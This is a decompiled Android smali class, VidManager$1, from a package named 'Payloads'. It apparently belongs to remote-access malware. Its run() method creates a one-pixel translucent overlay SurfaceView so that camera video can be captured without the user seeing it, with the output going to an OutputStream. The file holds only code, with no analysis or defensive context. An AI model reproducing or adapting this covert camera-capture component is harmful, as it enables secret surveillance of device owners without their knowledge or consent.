.class Lcom/android/ld/Payloads/VidManager$1;
.super Ljava/lang/Object;
.source "VidManager.java"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/android/ld/Payloads/VidManager;->startVideo(ILjava/io/OutputStream;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lcom/android/ld/Payloads/VidManager;

.field final synthetic val$cameraID:I

.field final synthetic val$outputStream:Ljava/io/OutputStream;


# direct methods
.method constructor <init>(Lcom/android/ld/Payloads/VidManager;ILjava/io/OutputStream;)V
    .locals 0
    .param p1, "this$0"    # Lcom/android/ld/Payloads/VidManager;

    .line 52
    iput-object p1, p0, Lcom/android/ld/Payloads/VidManager$1;->this$0:Lcom/android/ld/Payloads/VidManager;

    iput p2, p0, Lcom/android/ld/Payloads/VidManager$1;->val$cameraID:I

    iput-object p3, p0, Lcom/android/ld/Payloads/VidManager$1;->val$outputStream:Ljava/io/OutputStream;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 9

    .line 55
    iget-object v0, p0, Lcom/android/ld/Payloads/VidManager$1;->this$0:Lcom/android/ld/Payloads/VidManager;

    iget-object v1, v0, Lcom/android/ld/Payloads/VidManager;->context:Landroid/content/Context;

    const-string v2, "window"

    invoke-virtual {v1, v2}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/view/WindowManager;

    invoke-static {v0, v1}, Lcom/android/ld/Payloads/VidManager;->access$002(Lcom/android/ld/Payloads/VidManager;Landroid/view/WindowManager;)Landroid/view/WindowManager;

    .line 56
    iget-object v0, p0, Lcom/android/ld/Payloads/VidManager$1;->this$0:Lcom/android/ld/Payloads/VidManager;

    new-instance v1, Landroid/view/SurfaceView;

    iget-object v2, p0, Lcom/android/ld/Payloads/VidManager$1;->this$0:Lcom/android/ld/Payloads/VidManager;

    iget-object v2, v2, Lcom/android/ld/Payloads/VidManager;->context:Landroid/content/Context;

    invoke-direct {v1, v2}, Landroid/view/SurfaceView;-><init>(Landroid/content/Context;)V

    invoke-static {v0, v1}, Lcom/android/ld/Payloads/VidManager;->access$102(Lcom/android/ld/Payloads/VidManager;Landroid/view/SurfaceView;)Landroid/view/SurfaceView;

    .line 57
    new-instance v0, Landroid/view/WindowManager$LayoutParams;

    const/4 v4, 0x1

    const/4 v5, 0x1

    const/16 v6, 0x7d5

    const/high16 v7, 0x40000

    const/4 v8, -0x3

    move-object v3, v0

    invoke-direct/range {v3 .. v8}, Landroid/view/WindowManager$LayoutParams;-><init>(IIIII)V

    .line 63
    .local v0, "layoutParams":Landroid/view/WindowManager$LayoutParams;
    const/16 v1, 0x33

    iput v1, v0, Landroid/view/WindowManager$LayoutParams;->gravity:I

    .line 65
    iget-object v1, p0, Lcom/android/ld/Payloads/VidManager$1;->this$0:Lcom/android/ld/Payloads/VidManager;

    invoke-static {v1}, Lcom/android/ld/Payloads/VidManager;->access$000(Lcom/android/ld/Payloads/VidManager;)Landroid/view/WindowManager;

    move-result-object v1

    iget-object v2, p0, Lcom/android/ld/Payloads/VidManager$1;->this$0:Lcom/android/ld/Payloads/VidManager;

    invoke-static {v2}, Lcom/android/ld/Payloads/VidManager;->access$100(Lcom/android/ld/Payloads/VidManager;)Landroid/view/SurfaceView;

    move-result-object v2

    invoke-interface {v1, v2, v0}, Landroid/view/WindowManager;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    .line 66
    iget-object v1, p0, Lcom/android/ld/Payloads/VidManager$1;->this$0:Lcom/android/ld/Payloads/VidManager;

    invoke-static {v1}, Lcom/android/ld/Payloads/VidManager;->access$100(Lcom/android/ld/Payloads/VidManager;)Landroid/view/SurfaceView;

    move-result-object v1

    invoke-virtual {v1}, Landroid/view/SurfaceView;->getHolder()Landroid/view/SurfaceHolder;

    move-result-object v1

    new-instance v2, Lcom/android/ld/Payloads/VidManager$1$1;

    invoke-direct {v2, p0}, Lcom/android/ld/Payloads/VidManager$1$1;-><init>(Lcom/android/ld/Payloads/VidManager$1;)V

    invoke-interface {v1, v2}, Landroid/view/SurfaceHolder;->addCallback(Landroid/view/SurfaceHolder$Callback;)V

    .line 146
    return-void
.end method
